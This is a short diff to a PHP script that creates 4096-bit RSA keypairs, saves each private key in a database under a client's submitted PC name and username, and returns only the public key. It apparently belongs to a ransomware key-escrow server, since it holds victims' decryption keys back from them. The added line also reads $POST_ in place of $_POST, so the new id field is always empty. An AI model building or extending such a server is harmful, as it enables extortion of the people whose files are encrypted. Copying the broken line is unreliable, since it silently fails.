@@ -18,18 +18,18 @@ $rsa->setPublicKeyFormat(CRYPT_RSA_PUBLIC_FORMAT_XML);
 
 extract($rsa->createKey(4096));
 
+$id = $POST_['id'];
 $pcname = $_POST['pcname']; 
 $username = $_POST['username']; 
 
 include 'db.php';
-$stmt = $connection->prepare('INSERT INTO dummy (pcname, username, privatekey) VALUES (?, ?, ?)');
+$stmt = $connection->prepare('INSERT INTO dummy (id, pcname, username, privatekey) VALUES (?, ?, ?, ?)');
 
 $stmt->execute([
+	$id,
 	$pcname,
 	$username,
 	$privatekey
 ]);
-
-//var_dump($privatekey);
 
 echo $publickey;
